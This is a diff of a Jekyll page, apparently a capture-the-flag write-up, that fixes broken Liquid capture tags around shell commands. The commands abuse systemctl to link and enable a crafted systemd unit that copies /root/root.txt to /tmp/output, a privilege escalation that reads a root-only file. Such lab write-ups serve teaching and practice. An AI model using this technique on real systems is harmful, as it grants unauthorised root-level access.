@@ -65,11 +65,11 @@ ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
 [Install]
 WantedBy=multi-user.target' > $eop{% endcapture %} {% include code.html code=code lang="bash"%}
 
-{% endcapture %} {% include code.html code=code lang="bash"%}/bin/systemctl link $eop{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}/bin/systemctl link $eop{% endcapture %} {% include code.html code=code lang="bash"%}
 
-{% endcapture %} {% include code.html code=code lang="bash"%}/bin/systemctl enable --now $eop{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}/bin/systemctl enable --now $eop{% endcapture %} {% include code.html code=code lang="bash"%}
 
 
 Capture the flag from the manipulated output file.
-{% endcapture %} {% include code.html code=code lang="bash"%}cat /tmp/output{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}cat /tmp/output{% endcapture %} {% include code.html code=code lang="bash"%}
 
